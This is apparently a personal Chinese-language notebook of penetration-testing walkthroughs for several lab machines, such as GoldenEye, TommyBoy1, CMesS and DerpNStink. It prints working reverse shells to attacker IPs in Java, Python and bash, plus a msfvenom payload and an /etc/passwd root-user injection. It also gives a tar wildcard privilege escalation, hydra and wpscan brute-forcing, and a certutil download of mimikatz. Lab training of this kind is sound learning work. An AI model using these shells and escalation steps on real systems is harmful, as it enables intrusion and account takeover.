![image.png](https://s2.loli.net/2025/05/01/fUSpbracDtnqNYZ.png)

但反弹不了shell 很离谱

插一个一句话木马

![image.png](https://s2.loli.net/2025/05/01/wCJGjRtY8MHpKmX.png)

![image.png](https://s2.loli.net/2025/05/01/NWkD3vqZ8tozjf2.png)

蚁剑连接成功 然后上传一个反弹shell然后反弹到kali中

## 提权
### chrootkit提权
简单收集一下信息 
![image.png](https://s2.loli.net/2025/05/01/T8adCgiU3XwG6hI.png)


#注意 要检查一个地方 /etc/cron* 计划

![image.png](https://s2.loli.net/2025/05/01/mNyWC2eh1E39rXT.png)

发现有个chrootkit

#注意 chrootkit提权

有个漏洞是这么说的

```
cd /tmp
echo "chmod 777 /etc/passwd" > update
chmod 777 update
cat update

echo 'qq:$1$qq$oMgRCtJEEoFVvNbosRA.B1:0:0::/root:/bin/bash' >> /etc/passwd

```

![image.png](https://s2.loli.net/2025/05/01/e9pVdarAQR6v5Ew.png)

切换到我们新建的root用户就能成功提权

![image.png](https://s2.loli.net/2025/05/01/95gDALMXrFmKfyV.png)

### msf提权
需要创建一个msfvenom 用msf来反弹shell（multi/handler）

```
msfvenom -p php/meterpreter/reverse_tcp LHOST=61.139.2.153 LPORT=443 > shellde_php.php 

# msf需要配置相同的payload
```

![image.png](https://s2.loli.net/2025/05/01/LxsEiDIMBJa76HX.png)

search chrootkit 配置lport和session就能成功提权

![image.png](https://s2.loli.net/2025/05/01/GmzInQTrN4y6WXb.png)

# Internal

## nmap扫描端口
## feroxbuster爆破文件路径

发现有个wordpress和phpadmin这两个东西

## wordpress信息收集

wpscan扫描 没有发现枚举用户

其实是只开始的时候弄错了路径

```
wpscan --url http://10.10.26.101/blog --enumerate u
```

![image.png](https://s2.loli.net/2025/05/01/3IevRSJK8961jHx.png)


## phpmyadmin信息收集

这个用了root:root登录进去

## 卡死了
现在唯独两个要点 一个是 wordpress 一个是phpmyadmin 不知道下一步如何解决


## wordpress爆破密码
```
wpscan --url http://10.10.26.101/blog --usernames=admin --passwords=/root/rockyou.txt -t 600
```

![image.png](https://s2.loli.net/2025/05/01/tnSm3dzhbXLGJYy.png)

成功破解出来

## 反弹shell到kali
登录进wp之后 就想办法反弹shell到kali

经典在主题的php语法中插入php反弹shell

反弹成功

![image.png](https://s2.loli.net/2025/05/01/ML4ukvjd8hlgxA5.png)


## 提权
在很多个文件和定时任务都检查了一遍 发现我们现在还是www-data用户 要想办法提权

但问题是已经找了很多地方都没啥用

祭出linpeas脚本来详细检查一下

![image.png](https://s2.loli.net/2025/05/01/6WLeoC1nucxI54O.png)

ssh允许root登录

这也许是个突破口


![image.png](https://s2.loli.net/2025/05/01/RIsfLzCGJY8HKZ6.png)


好家伙 没找仔细 空文件夹

![image.png](https://s2.loli.net/2025/05/01/apqRDujZhGPQ5kd.png)

知道了一个我们要的用户的账户密码

## 成功登录 接着信息收集

在这个用户的文件夹中发现了一个线索

![image.png](https://s2.loli.net/2025/05/01/GtN9vCKbeufhmrA.png)


## ssh转发 端口映射

![image.png](https://s2.loli.net/2025/05/01/jxrMqhZvdPFlKH2.png)


访问localhost：6767


## 暴力破解
发现是个jenkins网页  选择爆破网站

```
hydra -l admin -P rockyou.txt -s 6767 127.0.0.1 http-post-form  '/j_acegi_security_check:j_username=^user^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password' -v -f

-s 6767                 # 目标服务端口
```
[[linux工具#^995249]]

[[linux工具#^71d08f]]

#注意 hydra的高级用法

在爆破的时候总是会忘记如何进行配置'/j_acegi_security_check:j_username=^user^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password' 像这样复杂的参数

在遇到这种情况 f12打开开发工具

![image.png](https://s2.loli.net/2025/05/01/7qQkECvaY4HFdcI.png)

注意我们的post包 左边的圈就是我们需要设置的爆破的路径 类似/login.php这样的 右边的是详细的值 这里需要把我们输入的值改成^PASS^和^user^ 最后加上报错的信息

还有一个要注意的 就是假如说用户是固定的 eg 用户是admin name 后面的^user^也要改成admin

前面就是因为这个问题一直没爆破出来

![image.png](https://s2.loli.net/2025/05/01/rDdC4EKfXaZqx9i.png)

## 反弹shell

```
java 反弹shell
String host="10.17.40.203";
int port=6666;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
[[shell和提权#^5af79a]]

进去之后寻找脚本运行

![image.png](https://s2.loli.net/2025/05/01/qyobInrugsa4GpL.png)


反弹shell成功


## 提权
先信息收集一下
![image.png](https://s2.loli.net/2025/05/01/3TWfYaEJQe19ud5.png)

![image.png](https://s2.loli.net/2025/05/01/sGSV5pHOABP3yiR.png)


![image.png](https://s2.loli.net/2025/05/01/x9ObB2UAfcJyrT3.png)


![image.png](https://s2.loli.net/2025/05/01/mJoSjcn5Lrhz6E3.png)

![image.png](https://s2.loli.net/2025/05/01/fFHhN9iQZdcjrPq.png)

这个note.txt有点可疑

![image.png](https://s2.loli.net/2025/05/01/QX7KsT15DIJC8o2.png)


居然发现了root账户密码 兴高采烈的去切换用户 结果发现压根用不了sudo 和su

只能另请高明  在之前的用户那里直接可以用这个凭证su到root权限 无需别的操作


# GoldenEye-v1
[[GoldenEye-v1]]
## nmap扫描端口

## 访问一下网站 文件路径爆破
遇到这啥都没的网页 目录爆破一下

有个css文件和js文件 访问这个js文件居然发现了遗留的密码

![image.png](https://s2.loli.net/2025/05/02/HUrxGXIp6OtquVd.png)

用这个来登录网站 但失败了 可能是别的地方

笑了 登录的进去

## pop3
网页告诉我们有个线索 pop3端口  

#注意 其实也是我们收集线索不全 nmap扫描的时候就应该把全端口扫描一遍

暴力破解一下 因为前面得知了有两个用户 就一起爆破了
```
hydra -L d.txt -P rockyou.txt -s 55007 61.139.2.168 pop3
```

但大字典跑的费劲了 而且这个用户名开头还不能是大写 只能改进一下

```
hydra -L rong.txt -P /usr/share/wordlists/fasttrack.txt -s 55007 61.139.2.168 pop3 -t 64
```
[[linux工具#^9335c2]]

![image.png](https://s2.loli.net/2025/05/02/jlCoGuOnxK8NTqH.png)

破解成功

登录进去能看到两份邮件

在其中一个中找到了网站路径和账户密码
![image.png](https://s2.loli.net/2025/05/02/aClAp3bGFRjKhXL.png)

## 登录网站
![image.png](https://s2.loli.net/2025/05/02/vYdaJxsQMt53KjO.png)


在一个地方找到一封邮件

![image.png](https://s2.loli.net/2025/05/02/oUTkvZEjHOLcz85.png)

邮箱账户是doak 我们拉到hydra去爆破

```
hydra -l doak -P /usr/share/wordlists/fasttrack.txt -s 55007 61.139.2.168 pop3 -t 64 
```

![image.png](https://s2.loli.net/2025/05/02/3auzH2q7E4F8SsP.png)

登录进去看看

又找到新的密码

![image.png](https://s2.loli.net/2025/05/02/8AnP49ErIg5RSMs.png)

登录到doak的账户看看有啥吗 找到一个路径并下载了图片

binwalk和foremost都分离不出来

又试了试exiftool和strings

发现有个base64加密的东东

![image.png](https://s2.loli.net/2025/05/02/Vq3GMJXwo58NKlS.png)

估计是密码还是啥

用admin和密码成功登录进管理员用户

## 漏洞利用

### 配置 反弹shell
其实就是在网站能否找到能够执行反弹shell的代码 这里原本是个拼写检查 我们设置成shell


![image.png](https://s2.loli.net/2025/05/02/l6BdYF5qitJbgEa.png)


找到个地方 可以修改系统路径 我们用 python反弹shell试试

```
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("61.139.2.153",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
 
![image.png](https://s2.loli.net/2025/05/02/DUyAfvF3ogYeP2s.png)

反弹成功

![image.png](https://s2.loli.net/2025/05/02/vHo5MIFnbzrhT6O.png)


## 提权
![image.png](https://s2.loli.net/2025/05/02/ncNIl2WFSOTGfYq.png)

内核提权

要注意一点 这里面没有gcc环境 只能通过cc来编译

里面有些部分需要改
```
sed -i 's/gcc/cc/g' 37292.c
```
![image.png](https://s2.loli.net/2025/05/02/sO8DINnSetYxTwh.png)

运行即可提权

![image.png](https://s2.loli.net/2025/05/02/1FOPiy3ftIsqJzN.png)

![image.png](https://s2.loli.net/2025/05/02/9DKFmrqjVd1n64p.png)

提权成功

# TommyBoy1
[[TommyBoy1]]
## nmap扫描端口和文件爆破
## 很多迷惑项 
选择dirb 后面过滤一下
![image.png](https://s2.loli.net/2025/05/02/pnuEljJxFO2YSVQ.png)

在robots.txt 中告诉我们很多个路径 我们挨个找找看

![image.png](https://s2.loli.net/2025/05/02/cWZl1pzJ2HhYKe6.png)

找到第一个flag


## 依旧信息收集

在80端口的网页的源代码中发现了隐藏部分

说线索是在视频中 这个就是路径 /prehistoricforest

## 依旧爆破
发现是个wp网页 查看一下他们的评论 发现有个路径里面有带密码的照片 把照片下载过来 exiftool分析一下

![image.png](https://s2.loli.net/2025/05/02/oXnK5uRsaJb9Oqm.png)

有个用户评论 应该是个md5 

![image.png](https://s2.loli.net/2025/05/02/KlxTIZ61ULN9k8d.png)

他们说是受保护的博客文章上输入的密码

找到需要密码才能看得博客 

继续信息收集

博客说是要用ftp访问 有了账户密码

ftp服务器被关了 只能找找别的东西

逛博客找到了第二个flag

![image.png](https://s2.loli.net/2025/05/02/ykXrLO7exWPwgmM.png)


从ftp上下载了一个txt 告诉我们一个新的路径 在8008里面

![image.png](https://s2.loli.net/2025/05/02/5nNaVc8mFjeU9xJ.png)

但访问不了 很奇怪

看了人家说法是说要改代理 

steve jobs就是iPhone 代理改成iphone 成功访问

给dirb加个ua再去爆破

-a 表示加个user-agent
```
dirb http://61.139.2.169:8008/NickIzL33t/ -a "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"  -X .html
```

发现并不能跑出来 又陆陆续续换了好多个

```
gobuster dir -u http://61.139.2.169:8008/NickIzL33t/ -H "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/537.36" -w /root/rockyou.txt -x html
```

![image.png](https://s2.loli.net/2025/05/02/srcZQoLWBpA7YmX.png)

OK 这个跑出来了

![image.png](https://s2.loli.net/2025/05/02/c1gpFe8YAVh2E79.png)

找到第三个flag

![image.png](https://s2.loli.net/2025/05/02/FOZYtL93HJEcWKb.png)

## 破解出密码
第一个网页给我们提示 根据密码规则 ​**​"bev + 1大写字母 + 2数字 + 2小写字母 + 1符号 + 1995"​**​（总长度13字符）

```
crunch 13 13 -t bev,%%@@^1995 -d 1@ -o passlist.txt
生成出满足要求的密码
zip2john 压缩包名 > name.txt
john --wordlists=passlist.txt name.txt 
```

![image.png](https://s2.loli.net/2025/05/02/NtBuc31YRzs6Eyd.png)

## wp网站破解
用枚举出来的用户进行破解
```
wpscan --url http://61.139.2.169/prehistoricforest/ --usernames=tom --passwords=/root/rockyou.txt
```

![image.png](https://s2.loli.net/2025/05/02/GM71Y6u9A45NQoE.png)

别的两个用户破解不出


## ssh登录
登进去看到了一个博客 和密码本中的提示吻合

用这个账户登录ssh

![image.png](https://s2.loli.net/2025/05/02/jPb15aHZJNiR3o9.png)


找到第四个flag

![image.png](https://s2.loli.net/2025/05/02/eNvkO6EXJGBsn7Q.png)

提示是说root服务器的根目录

到/var/www/html目录下看看最大的文件夹 因为这里面都是乱的 只能这么过滤

![image.png](https://s2.loli.net/2025/05/02/Blt174n2pFqLcGV.png)


但发现里面还是没有 忘记一个地方了 8008端口的网页

![image.png](https://s2.loli.net/2025/05/02/2ifAdCxL7DjU1oH.png)

发现有个上传的php

![image.png](https://s2.loli.net/2025/05/02/kX92JxcrEQA1sql.png)

写一个shell.php进去
[[shell和提权#^3a4f50]]

测试一下 

![image.png](https://s2.loli.net/2025/05/02/PJB7Zog6eOxl8SL.png)

能成

根据提示我们能知道第五个flag在根目录下 隐藏这
![image.png](https://s2.loli.net/2025/05/02/jRmo7OGw4VUDiCs.png)

```
cat /.5.txt
```

![image.png](https://s2.loli.net/2025/05/02/1zd6qNHp2WiRguE.png)

用前面的flag合体就是压缩包的密码

![image.png](https://s2.loli.net/2025/05/02/nDSAxBgVQizce5r.png)


彻底完成 这个坐牢靶场


# W34KN3SS
[[W34KN3SS]]
## nmap扫描端口和文件爆破
有一个test.html 还有个uploads和blogs但进去就是个文件夹
## 没线索了 仔细查看nmap

![image.png](https://s2.loli.net/2025/05/02/8qYF1w7uyvXADpl.png)

发现有个这个域名 绑了/etc/hosts之后 访问一下 顺便文件路径爆破

![image.png](https://s2.loli.net/2025/05/02/ynMZrJ67tv48gCT.png)

来找找找看有啥东西吗

有个公钥和txt

告诉我们是0.9.8c-1的版本 搜索漏洞能找到ssl的撞库碰撞 低版本ssl撞库

在这些密钥对 找到与我们公钥对匹配的

```
grep -onr
```

![image.png](https://s2.loli.net/2025/05/03/mz2soO8YquLURHC.png)

```
ssh -i 秘钥名 登录
```

# CMesS
[[CMesS]]
## nmap扫描端口和文件爆破
挂着大目录扫描着

说实话 一次没有出来就要 针对性去查找后缀

唯一的问题就是目录扫描工具不知道为啥扫不出来 总是连接失败

找到个robots.txt

![image.png](https://s2.loli.net/2025/05/03/udjYHK9tQFWJ135.png)

重点宠幸一下这些

并无

## 找找有注入点吗
并无

## 思路大错特错
提示要求是模糊测试 对子域

我们得枚举出子域

wfuzz专场
```
wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt -u 'http://cmess.thm/FUZZ' --hh 3208
因为最开始最多的就是3208这个参数 把他过滤掉就能获得 可能有反应的路径
```


![image.png](https://s2.loli.net/2025/05/03/uzlt6whZp3kF7oq.png)

枚举子域名

```
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://cmess.thm/' -H "HOST:FUZZ.cmess.thm" --fw 522
```
[[linux工具#^59efba]]

[[linux工具#^bf5ac4]]

![image.png](https://s2.loli.net/2025/05/03/fvRHuPhVXQO7kZj.png)

发现一个子域名 dev

在/etc/host配置完后 开始看看有啥信息吗

找到个密码

![image.png](https://s2.loli.net/2025/05/03/5feXWS9KAPhjLsc.png)


## 文件上传或漏洞利用
根据判断 账户密码应该就是这个 登录到了管理面板

发现一个文件上传 也是成功上传了

![image.png](https://s2.loli.net/2025/05/03/dZRoSHf1UK7NlXh.png)


但访问路径没有发现我的上传文件 很奇怪 只能放弃

![image.png](https://s2.loli.net/2025/05/03/ovGU6PhnbXAVrs4.png)


![image.png](https://s2.loli.net/2025/05/03/Qk7XZsyFEDgNA2L.png)

## 提权
dan 在opt找到个隐藏的备份文件 多留意opt
![image.png](https://s2.loli.net/2025/05/03/duNekXyJCKDQilF.png)


![image.png](https://s2.loli.net/2025/05/03/P9iuO13Dqg2IWSE.png)

## ssh登录
找到一个定时计划

![image.png](https://s2.loli.net/2025/05/03/69kUGqTMlWwQIBz.png)

## 提权（定时计划利用）
新的提权方法

```bash
若任务包含 `tar *` 等命令，可利用通配符参数注入：
touch --checkpoint=1 --checkpoint-action=exec=/bin/sh
通配符滥用
```

```
vi shell.sh

#!/bin/bash
/bin/bash -c "bash -i >& /dev/tcp/10.17.40.203/6666 0>&1 "

touch ./"--checkpoint=1"
touch ./"--checkpoint-action=exec=sh shell.sh"

```

![image.png](https://s2.loli.net/2025/05/03/fNxubJ7cmHSqPvU.png)

成功获得root

![image.png](https://s2.loli.net/2025/05/03/nwFUQa41NdErfX5.png)


# Rickdiculously Easy
[[Rickdiculously Easy]]
ctf题目
## nmap端口扫描加文件路径爆破

发现有匿名登录的21端口

![](https://s2.loli.net/2025/05/03/4OKNc8YzdEPwXCA.png)

下载了一个flag.txt但无提示

![image.png](https://s2.loli.net/2025/05/03/gheKq5T1uZFWjLY.png)

pub文件下载不了

 换个位置 文件路径看看

![image.png](https://s2.loli.net/2025/05/03/Mg1AHZRtX4PUbp5.png)


进去看看有啥信息吗

![image.png](https://s2.loli.net/2025/05/03/omdSkWRBvnfprHD.png)


![image.png](https://s2.loli.net/2025/05/03/g7RHkpxDqEBynjm.png)

![image.png](https://s2.loli.net/2025/05/03/F9keSTAz8ctVoPy.png)

好家伙居然真有密码 找到密码 继续查找

继续找找 robots.txt

![image.png](https://s2.loli.net/2025/05/03/s5TZ892rAtVyfqe.png)

在其中一个目录中找到一个类似命令注入的地方

![image.png](https://s2.loli.net/2025/05/03/M1n4cygoJqsORa6.png)

尝试一下命令注入

![image.png](https://s2.loli.net/2025/05/03/GATlQMa4HLKOFt7.png)

用分号居然成功了

成功爆出账户
![image.png](https://s2.loli.net/2025/05/03/7eCiVIgbkSzwfpF.png)


但后面没有啥思路 先停止一下

9090端口用不了 先看看别的

## 13337端口

![image.png](https://s2.loli.net/2025/05/03/GsC6b12PtOKx9U3.png)


## ssh登录

看到了一个flag

![image.png](https://s2.loli.net/2025/05/03/pxheWGrokfdEzq9.png)

发现一个压缩包和照片 用python传到kali里面分析

下载了imhex来分析图片 发现密码

![image.png](https://s2.loli.net/2025/05/03/6kxYwFXriOLesmB.png)

用这个密码来解压压缩包

![image.png](https://s2.loli.net/2025/05/03/EG1NuIrFhpDfiOx.png)

发现新的flag

## telnet 60000
![image.png](https://s2.loli.net/2025/05/03/aW5ECUdNR14wZBb.png)

## 60000端口
发现个flag
![image.png](https://s2.loli.net/2025/05/03/IuMRFU2WEGdH3zP.png)


# bob
## nmap扫描和字典爆破
![image.png](https://s2.loli.net/2025/05/04/n6xKkMJUwNPy4mL.png)

发现一个疑似命令注入点
![image.png](https://s2.loli.net/2025/05/04/5VxG7H16It32pTD.png)

反弹个shell

```
bash -c 'bash -i >& /dev/tcp/61.139.2.153/8888 0>&1'
```

反弹成功

## 信息收集
![image.png](https://s2.loli.net/2025/05/04/mC3sV7PNovu6a2W.png)

在bob的文件夹中发现了 这些东西 应该有用

![image.png](https://s2.loli.net/2025/05/04/AzZPv3n6cgsUENq.png)

![image.png](https://s2.loli.net/2025/05/04/tkZgKEUh2HP6eCw.png)


好家伙 居然发现了密码备份

![image.png](https://s2.loli.net/2025/05/04/LGjrOSiwA6DvctT.png)

有个新的用户

![image.png](https://s2.loli.net/2025/05/04/61QWTlr2tdELGuH.png)

用这个进行ssh登录 但发现没啥东西 因为我们在ssh登录前 就先把bob的目录看了一遍

为数不多的难点就是gpg的加密文件 用的是找到的一个脚本出来的开头英文字母

![image.png](https://s2.loli.net/2025/05/04/AzZPv3n6cgsUENq.png)

用这个解压出来 就是bob的用户 sudo -l看看 发现直接可以root

成功提权

![image.png](https://s2.loli.net/2025/05/04/angKJkzw9RbYWx5.png)


# Photographer
[[Photographer]]
有点oscp强度的靶场 试试看看

## nmap扫描和字典爆破
发现有个80端口，8000端口 还有smb服务

从80端口开始检查

![image.png](https://s2.loli.net/2025/05/04/dGNJx4mkXZ5u7Cf.png)


![image.png](https://s2.loli.net/2025/05/04/BnRYxQwtpMudbVs.png)


应该是没有具体的攻击点和有效信息

看看8000端口

有个登录界面 盲猜还有一个app的页面

![image.png](https://s2.loli.net/2025/05/04/6SviWJRjkAwFEN2.png)

![image.png](https://s2.loli.net/2025/05/04/SuJGrFqtD4UVIAn.png)


![image.png](https://s2.loli.net/2025/05/04/yzAqXN6vYrkhHKZ.png)

在8000端口的首页查看源码能发现这个cms的版本号是koken 0.22.24

![image.png](https://s2.loli.net/2025/05/04/w7SbjWzALfm9cU1.png)

发现一个漏洞

![image.png](https://s2.loli.net/2025/05/04/chPz14m5R9XDWbK.png)


目前情况是知道了这个8000端口是koken的cms 80端口静态网页 一个登录页面 但账户密码未知

## 检查smb

![image.png](https://s2.loli.net/2025/05/04/DSoHAN5z3ecB2s9.png)


发现有文件

用enumlinux枚举一下

```
enumlinux4 -a 
```

![image.png](https://s2.loli.net/2025/05/04/fbWwngrDIuaEPsq.png)


![image.png](https://s2.loli.net/2025/05/04/XOMsY7wuJCzcKam.png)

![image.png](https://s2.loli.net/2025/05/04/swmtALMnSJEhci6.png)

但另一个就登不进去

![image.png](https://s2.loli.net/2025/05/04/htBjxl4DYTyfv6d.png)

OK 发现一个这个人还创建了一个新网站 也就是我们刚刚下载的wordpress的备份文件 应该与这个有关

分析了这里面的配置文件 没有配置过的 

![image.png](https://s2.loli.net/2025/05/04/MrGQovtJwFqIVHh.png)

## 登录进去
说实话 这个有点奇葩了 看了wp才知道邮箱里面就有密码

![image.png](https://s2.loli.net/2025/05/04/KkTF9Ve4rMo7tCH.png)


成功登录进去了

上传图片马 shell.jpg的反弹shell bp抓包改后缀.php

上传之后在浏览界面查看就能反弹shell

![image.png](https://s2.loli.net/2025/05/04/LwuFmVcY6XHKCa5.png)

## 提权
### user.txt
![image.png](https://s2.loli.net/2025/05/04/enAMzOSVKwT7UPr.png)

### 信息收集
```
find / -user root -perm /4000
```

![image.png](https://s2.loli.net/2025/05/04/D1Tjo8MkRa5JHhx.png)


```
CMD="/bin/sh"
/usr/bin/php -r "pcntl_exec('/bin/sh', ['-p']);"

前面记得配置好php的路径
```


![image.png](https://s2.loli.net/2025/05/04/RqMTQFKgaxrcf2d.png)


# DerpNStink：1
[[DerpNStink：1]]
## nmap扫描和字典爆破
![image.png](https://s2.loli.net/2025/05/04/8cglmr2uK5DkBL3.png)

![image.png](https://s2.loli.net/2025/05/04/1U8sEKc3dvaTpD7.png)


发现有phpmyadmin和wp网页 这个是个突破点

## wpscan枚举
有个低版本的幻灯片放映 一开始我是没想到这一步
![image.png](https://s2.loli.net/2025/05/04/kYveWZD5gJVMi42.png)

用wpscan 枚举出了用户

![image.png](https://s2.loli.net/2025/05/04/s7kitwlQ2NgXmAV.png)

又枚举出了账户密码

![image.png](https://s2.loli.net/2025/05/04/BsfQny73RCWozNe.png)


发现了一个文件上传的漏洞  本来是看了wp wp都说msf去攻击 但查了一下这个幻灯片的版本漏洞 发现有个文件上传。试着把php文件上传上去 居然成功


用这个路径访问反弹shell文件 ok 反弹成功

```
http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/shell.php
```

![image.png](https://s2.loli.net/2025/05/04/6cyU5VLW4wA1Hiu.png)


![image.png](https://s2.loli.net/2025/05/04/ULuvGVxAenRitZW.png)


## 提权
进去查看却发现这两个用户都是其他用户无法访问 只能另请高明了

![image.png](https://s2.loli.net/2025/05/04/Su1piw2W8a3BVfn.png)

发现有个mysql 尝试登录一下 成功

![image.png](https://s2.loli.net/2025/05/04/CufbPKvAQqdVB2c.png)

mysql的用户
![image.png](https://s2.loli.net/2025/05/04/mkfTDYPlzUJAF2c.png)


wp里面的用户

![image.png](https://s2.loli.net/2025/05/04/329e6qIRXWKBMNE.png)

尝试破解一下

![image.png](https://s2.loli.net/2025/05/04/sMwbpI3SW592mFa.png)

在wp中登录看看有什么信息吗 但我盲猜还是在另一个人的wp中反弹shell

![image.png](https://s2.loli.net/2025/05/04/OVC89JEtgqmp6zf.png)


在可执行php代码中插入反弹shell 即可反弹成功

但和上次反弹的用户还是哦 都是www-data其实有点白做了

留着先

## ftp登录
用ftp登录stinky 进去了

![image.png](https://s2.loli.net/2025/05/04/Cuw7V3SEO6afzJx.png)


找到了key.txt

![image.png](https://s2.loli.net/2025/05/04/WudoVgjAOJU5PRk.png)

用这个key进行ssh登录

```
ssh -i key.txt stinky@61.139.2.174
```

![image.png](https://s2.loli.net/2025/05/04/ICrWaGykRTho3Yf.png)

发现报错了 看了wp

需要加上 参数-o PubkeyAcceptedKeyTypes=+ssh-rsa

```
ssh -i key.txt stinky@61.139.2.174 -o PubkeyAcceptedKeyTypes=+ssh-rsa
```


登录进去找到第三个flag

![image.png](https://s2.loli.net/2025/05/04/d9wvNraVcu5EOUZ.png)

![image.png](https://s2.loli.net/2025/05/04/seTIM1NWSx8hJ7C.png)

发现一个流量包

得劲了 分析一手 好家伙 dns的流量分析

遇事不决就搜索关键词.php 找了半天总算找到了 

mrderp:derpderpderpderpderpderpderp

![image.png](https://s2.loli.net/2025/05/04/D7Thqn2SGdKea4Y.png)

在刚刚的wp网页中 并没有这个用户 可能是ssh或者别的地方

ssh试试看

![image.png](https://s2.loli.net/2025/05/04/PKRnHAehxvXqfOW.png)

成功

![image.png](https://s2.loli.net/2025/05/04/meUvJ52LpfcKX7V.png)

sudo -l看看 

```
/home/mrderp/binaries/derpy* 是在这里面

允许mrderp用户在主机上以root用户权限读写执行/home/mrderp/binaries/目录下derpy_开头的文件
```


意思就是在在这个目录下创建一个提权的脚步就行了

![image.png](https://s2.loli.net/2025/05/04/zOMDJXwihAlHR3v.png)

![image.png](https://s2.loli.net/2025/05/04/1G2VLnh93coiesl.png)



![image.png](https://s2.loli.net/2025/05/04/uL9ebyGS3fMW5z8.png)


# InfoSec Prep: OSCP
## nmap扫描和字典爆破
发现都是wp文件夹

## wpscan枚举
![image.png](https://s2.loli.net/2025/05/04/hx2dNKIjVlufWM1.png)

枚举出用户发现有个admin

wpscan 来爆破出admin

并没卵用

## ssh登录

忽略了最重要的信息了 oscp就是一个用户名 用secret.txt的公钥登录成功

![image.png](https://s2.loli.net/2025/05/04/g8FWUc267XhkiTP.png)

找到一个bash

![image.png](https://s2.loli.net/2025/05/04/Z7MJrhDxuPtpnGo.png)

bash提权

```
/usr/bin/bash -p
```

![image.png](https://s2.loli.net/2025/05/04/dOSc6QxzfrlX1hH.png)


![image.png](https://s2.loli.net/2025/05/04/rDQkqSH4Y5uVEdp.png)

想太复杂了


# Silver Platter
[[Silver Platter]]
少数开头很难受的靶场

## nmap扫描端口和文件爆破
端口扫出来8080 和80 

文件目录死活报不出来 可能是工具用的还不够多

![image.png](https://s2.loli.net/2025/05/06/ApYBJohg2cVZtRU.png)

但这两个没啥用 都进不去

![image.png](https://s2.loli.net/2025/05/06/SR1CMuDZWrcqKd5.png)

现在有个注意点 就是在这里

![image.png](https://s2.loli.net/2025/05/06/yxXzL3Tp8osqEIS.png)

好家伙 还真是

## 找漏洞 
遇到这种啥都没有的 只能找找漏洞 看看有什么漏洞利用的吗

找到一个漏洞 需要bp抓包

![image.png](https://s2.loli.net/2025/05/06/eOPUV2n6D5QoEpx.png)

需要bp抓包 把登录数据改成这个

成功登录

还需要使用别的漏洞

```
http://10.10.234.84:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=1
```

![image.png](https://s2.loli.net/2025/05/06/aU6G9wqlMfDuzi1.png)

查看邮件的时候找到了ssh登录密码

![image.png](https://s2.loli.net/2025/05/06/MFV9QDSc7l3AL2J.png)


登录进ssh

## 提权
找了很多地方都无能为力 其实忘记了 这个是个服务器

```
cat /var/log/auth* | grep -i pass
寻找登录的密码
```

![image.png](https://s2.loli.net/2025/05/06/mtfSN9gojXx1ahu.png)

找到tyler的密码了

大错特错 这个就是没有认真看日志的后果

![image.png](https://s2.loli.net/2025/05/06/mF5WhlRjJVkaMAT.png)

这里有个密码 _Zd_zx7N823/

ok成功登录tyler

![image.png](https://s2.loli.net/2025/05/06/MDCUFHz9ryOWl1X.png)

获得root权限

![image.png](https://s2.loli.net/2025/05/06/jhQNBRagAbscUW6.png)

成功提权

# Blueprint
## nmap扫描和字典爆破
8080端口有个oscommerce-2.3.4 搜一下看有什么漏洞利用吗

![image.png](https://s2.loli.net/2025/05/07/TkDouc6aJ1R4WEF.png)


## 漏洞利用
![image.png](https://s2.loli.net/2025/05/07/FxDOTC9zQHbpVJh.png)


已经是获得完全的shell了

## msf攻击
在msf中也能找到oscommerce的漏洞利用

![image.png](https://s2.loli.net/2025/05/07/z2ONL8bxKs6B3Gh.png)

使用第一个

在这里我们需要配置rhost，rhost，uri，lhost

rport是8080

uri则要改成

![image.png](https://s2.loli.net/2025/05/07/LiwQdE6Ruv81SKB.png)

这个路径 后面还是一样/install

![image.png](https://s2.loli.net/2025/05/07/CW7SRsLfbkJFvOo.png)

获得shell

但权限不够需要创建负载来反弹shell

## 解密lab用户
上传mimikatz来获得lab用户的ntlm值
```cmd
certutil -urlcache -split -f http://10.17.40.203：8000/mimikatz.exe mimikatz.exe

certutil工具 上传文件
certutil -urlcache -split -f
```

![image.png](https://s2.loli.net/2025/05/07/YFQfWOENt6wescX.png)


![image.png](https://s2.loli.net/2025/05/07/KGQCn1fNoJuRwvA.png)




![image.png](https://s2.loli.net/2025/05/07/JzOBvCuEWRQ9sNq.png)

## root flag
![image.png](https://s2.loli.net/2025/05/07/TpMSJvQqbUYig1I.png)



# djinn（奇）
[[djinn]]
## nmap扫描端口和文件爆破
![image.png](https://s2.loli.net/2025/05/09/jY89pToaZGqkbQn.png)

有个可以匿名登录的ftp服务器 里面还有几个txt 应该对我们有帮助

![image.png](https://s2.loli.net/2025/05/09/6c1yIKvCoWAXrgh.png)

下载看看

开放了一个1337端口和7331端口

![image.png](https://s2.loli.net/2025/05/09/iLdyWYsQ2JkODa8.png)


说是要回答1000次才会有奖品

## 无思路
其实到这里已经有点难绷了

看了一眼源码有个这个东西 应该是账户密码之类的
![image.png](https://s2.loli.net/2025/05/09/9fUKi8sPYuJzSr7.png)

## 字典爆破7311

这个端口进行字典爆破

![image.png](https://s2.loli.net/2025/05/09/nuacsQ7UfmMroyw.png)


发现有两个路径

其中一个是个命令注入

![image.png](https://s2.loli.net/2025/05/09/qaEGmoMC3fiS4jg.png)



![](https://s2.loli.net/2025/05/09/9Uj6eqXoN2YPZMh.png)

藏这么深 想办法进行反弹shell

正常输入是没得效果的 转编码试试

